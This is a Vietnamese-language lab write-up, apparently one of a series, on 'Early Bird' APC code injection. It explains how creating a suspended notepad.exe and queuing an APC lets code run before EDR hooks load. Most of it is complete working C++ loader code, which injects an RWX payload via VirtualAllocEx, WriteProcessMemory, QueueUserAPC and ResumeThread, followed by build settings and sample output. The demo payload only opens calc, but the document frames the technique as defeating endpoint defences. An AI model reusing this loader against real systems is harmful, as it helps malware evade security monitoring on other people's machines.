
---

# 📝 [PE 12] Early Bird Injection

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Early Bird Injection** là một biến thể tối ưu nâng cao từ kỹ thuật APC Injection truyền thống (PE 11), thuộc nhóm **Né tránh phòng thủ động tầng sâu (Advanced Dynamic Evasion)**.

Trong các cuộc đối đầu thực tế với EDR hiện đại, nếu ta gọi `QueueUserAPC` vào một luồng đang chạy của một tiến trình đã hoạt động lâu, hành vi này rất dễ bị bắt bài bởi các hàm Hook giám sát động. Kỹ thuật `Early Bird` hóa giải bài toán này bằng cách can thiệp vào **giai đoạn sơ khởi nhất của vòng đời tiến trình** (Early Lifecycle). Bằng cách tạo một tiến trình vỏ bọc (ví dụ: `notepad.exe`) ở trạng thái đóng băng hoàn toàn (`CREATE_SUSPENDED`), ta gài mã máy vào hàng đợi APC của luồng chính trước khi bất kỳ một phân hệ giám sát hay DLL Hook của EDR kịp chèn vào không gian ảo của nạn nhân.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa các bộ quét hành vi động của EDR bằng cách thực thi mã máy trước khi bộ lọc an ninh được khởi tạo.
* Khai thác triệt để cơ chế xử lý APC sơ khởi của Windows Kernel khi luồng chính thức tỉnh.
* Áp dụng quy trình tự động định vị vị trí thư mục hệ thống thực tế (**Active Path Custom**) để đạt độ linh hoạt kịch trần.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi một tiến trình được sinh ra với cờ `CREATE_SUSPENDED`, Windows Kernel khởi tạo cấu trúc dữ liệu nền tảng nhưng hoãn việc nạp mã máy chính. Lúc này, tiến trình nằm trong trạng thái "nguyên thủy", các thư viện giám sát của bên thứ ba (EDR DLLs) chưa hề được chèn (Inject) vào không gian ảo.

Quy trình toán học giải phẫu và điều hướng luồng của Lab PE 12 diễn ra qua các bước ngầm sau tại tầng Kernel:

```
[CreateProcessW: Trạng thái đóng băng nguyên thủy] ──> [VirtualAllocEx: Ánh xạ Payload] ──> [QueueUserAPC: Gài mìn hàng đợi luồng chính] ──> [ResumeThread: Khai hỏa trước EDR]

```

1. **Khóa chân luồng tại vạch xuất phát (`CREATE_SUSPENDED`)**: Hệ điều hành nạp file thực thi lên RAM nhưng chặn luồng chính không cho chạy qua điểm EntryPoint hệ thống. Tại thời điểm này, không gian địa chỉ ảo của Notepad hoàn toàn phẳng sạch nguyên bản.
2. **Gài bẫy bất đồng bộ sơ khởi (`QueueUserAPC`)**: Loader đẩy khối mã máy thực thi độc lập vị trí (PIC) và cấu trúc tham số tuyệt đối vào RAM Notepad, sau đó gọi `QueueUserAPC`. Kernel Windows chèn thực thể APC vào đỉnh hàng đợi của luồng chính `pi.hThread`.
3. **Chiếm quyền ưu tiên tuyệt đối (`ResumeThread`)**: Khi Loader phát lệnh rã đông, Windows Kernel thức tỉnh luồng chính. Theo thiết kế cốt lõi của Windows Subsystem, trước khi luồng chính kịp nhảy vào mã máy của chính nó (hoặc thực thi đoạn mã khởi tạo DLL của EDR), Kernel bắt buộc phải kiểm tra và giải tỏa hàng đợi APC trước. Do đó, Payload của ta được CPU bốc lên chạy trước tiên, hoàn thành chiến dịch Evasion tuyệt đối.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tính toán thư mục hệ thống thực tế bằng `GetSystemDirectoryW` để đạt độ linh hoạt tối đa trên Windows 11.

```cpp
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm gánh logic thực thi độc lập vị trí khi luồng chính thức thức dậy
DWORD WINAPI EarlyBirdApcPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối tuyệt đối, né sạch lỗi địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Giải thuật tự động định vị vị trí thư mục hệ thống thực tế (Zero Static Buffers)
std::wstring GetActiveSystemTarget(const std::wstring& exeName) {
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    std::vector<wchar_t> systemDirBuf(requiredSize);
    if (GetSystemDirectoryW(systemDirBuf.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(systemDirBuf.data());
    finalPath += L"\\" + exeName; 
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 12: EARLY BIRD CODE INJECTION ACTIVE" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Định vị động bản đồ thư mục hệ thống thực tế, không gán cứng chuỗi tĩnh
    std::wstring targetExeName = L"notepad.exe";
    std::wstring dynamicPath = GetActiveSystemTarget(targetExeName);

    if (dynamicPath.empty()) {
        std::cerr << "[-] Khong the chu dong xac dinh duong dan he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Da chu dong dinh vi tien trinh vo boc: " << dynamicPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // ─── BƯỚC 1: KHỞI TẠO TIẾN TRÌNH VỎ BỌC Ở TRẠNG THÁI ĐÓNG BĂNG HOÀN TOÀN ───
    std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang (CREATE_SUSPENDED)..." << std::endl;
    BOOL success = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(dynamicPath.c_str()), // Nạp chuỗi đường dẫn chủ động thích ứng
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED, // Giữ chặt luồng ngay vạch xuất phát trước khi EDR kịp chèn Hook
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "[-] CreateProcessW failed. Error: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tien trinh vo boc duoc tao thanh cong! PID: " << pi.dwProcessId << " | ThreadID: " << pi.dwThreadId << std::endl;

    // Áp dụng quy trình Cấp phát động Thích ứng vừa khít cấu trúc
    SIZE_T functionSize = 500;

    // ─── BƯỚC 2: CẤP PHÁT BỘ NHỚ TỪ XA MANG QUYỀN RWX ĐỂ CHỨA PAYLOAD ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX cua payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // ─── BƯỚC 3: KHỞI TẠO CON TRỎ TUYỆT ĐỐI VÀ ĐẨY SANG RAM NOTEPAD ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy linh hồn mã máy và tham số tuyệt đối vào lòng Notepad từ xa
    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPCVOID)EarlyBirdApcPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa logic ham va tham so vao xac rong hoan tat." << std::endl;

    // ─── BƯỚC 4: CHIẾN THUẬT CHIM NON - GÀI ĐỊA CHỈ VÀO HÀNG ĐỢI APC LUỒNG CHÍNH ───
    std::cout << "[*] Dang gai ham vao hang doi QueueUserAPC cua luong chinh..." << std::endl;
    DWORD apcStatus = QueueUserAPC((PAPCFUNC)remoteCodeBuffer, pi.hThread, (ULONG_PTR)pRemoteData);

    if (apcStatus == 0) {
        std::cerr << "[-] QueueUserAPC failed. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(pi.hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, pRemoteData, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Gai hang doi APC Early Bird thanh cong!" << std::endl;

    // ─── BƯỚC 5: RÃ ĐÔNG LUỒNG CHÍNH ĐỂ TIẾN TRÌNH TỰ ĐỘNG KHAI HỎA ───
    std::cout << "[*] Kich hoat ra dong (ResumeThread). He dieu hanh thuc day tu dong loi APC thuc thi..." << std::endl;
    ResumeThread(pi.hThread);

    std::cout << "\n[+] Early Bird Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so va don dep tai nguyen..." << std::endl;
    std::cin.get();

    // Thu hồi Handle hệ thống phẳng sạch chống rò rỉ tài nguyên
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại mục `Runtime Library`, chuyển cấu hình thành **`Multi-threaded (/MT)`** để nhúng tĩnh toàn bộ thư viện hệ thống.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Khởi chạy tệp nhị phân thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để giám sát vòng đời sơ khởi:

```powershell
PS C:\Workspace\x64\Release> .\PE12_EarlyBird_Injection.exe
====================================================
[*] PE 12: EARLY BIRD CODE INJECTION
====================================================
[+] Da chu dong dinh vi tien trinh vo boc: C:\WINDOWS\system32\notepad.exe
[*] Dang khoi tao tien trinh vo boc o trang thai dong bang (CREATE_SUSPENDED)...
[+] Tien trinh vo boc duoc tao thanh cong! PID: 5656 | ThreadID: 13484
[+] Vung nho Code RWX cua payload dat tai: 0x00000185B0DC0000
[+] Anh xa logic ham va tham so vao xac rong hoan tat.
[*] Dang gai ham vao hang doi QueueUserAPC cua luong chinh...
[+] Gai hang doi APC Early Bird thanh cong!
[*] Kich hoat ra dong (ResumeThread). He dieu hanh thuc day tu dong loi APC thuc thi...

[+] Early Bird Injection Process Completed Successfully!
[*] Nhan phim Enter de dong cua so va don dep tai nguyen...

```

*🎯 Hệ quả RAM:* Tiến trình vỏ bọc vừa thức dậy, Windows Kernel lập tức triệu hồi hàng đợi APC ngay trước khi mã khởi tạo của EDR chèn vào, mở bung Máy tính `calc.exe` hiên ngang rực rỡ kịch trần!

---
